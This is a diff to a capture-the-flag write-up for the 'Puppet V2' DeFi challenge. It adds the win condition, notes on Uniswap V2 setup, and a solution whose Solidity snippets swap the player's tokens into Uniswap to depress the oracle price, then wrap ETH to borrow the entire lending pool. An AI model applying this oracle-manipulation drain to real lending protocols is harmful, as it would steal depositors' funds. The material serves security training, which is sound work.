@@ -534,11 +534,19 @@ lendingPool.borrow
 
 ## 09 Puppet V2
 
+To beat this level, we need to comply with
+
+```solidity
+// Player has taken all tokens from the pool
+assertEq(token.balanceOf(address(lendingPool)), 0);
+assertGe(token.balanceOf(msg.sender), POOL_INITIAL_TOKEN_BALANCE);
+```
+
 ### Challenge Setup Notes
 
 * Initially we added the libs of uniswap2 as dependencies, referenced using interfaces.
 * But there was this problem when referencing created pairs: The function `pairFor()` at `UniswapV2Library.sol` uses a init code hash.
-* Some initial investigation points that this happens due to be working on testsnets.
+* Some initial investigation points that this happens due to be working on a testnet.
 
 * Solution was just copy the library files we needed into the `puppet-v2` challenge's directory sources, and modify that line, computing the new init code hash from the function `UniswapV2Factory.createPair()`.
 
@@ -563,3 +571,32 @@ pair = address(uint(keccak256(abi.encodePacked(
         hex'e091aae7c9eeedb6bff7e60c8e1a808d9cdc235f6b2e6e93284b02a4170f9361'
     ))));
 ```
+
+### Solution
+
+We need to lower the cost of the token, then use our ETH to borrow the whole pool.
+
+Let's send all of the token we have been assigned at the challenge to the uniswap exchange
+
+```solidity
+token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+address[] memory path = new address[](2);
+path[0] = address(token);
+path[1] = address(weth);
+uniswapRouter.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp + 1);
+```
+
+We will receive ETH, so let's implement `receive()` at our attacking smart contract.
+
+Next, just borrow using your initial amount plus the ETH you received. Notice that it is required to wrap the ETH and make it available for transfer.
+
+```solidity
+uint256 weth_required = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+weth.deposit{value: weth_required}();
+weth.approve(address(lendingPool), weth_required);
+```
+
+### References
+
+* https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensforeth
+* https://github.com/transmissions11/solmate/blob/main/src/tokens/WETH.sol
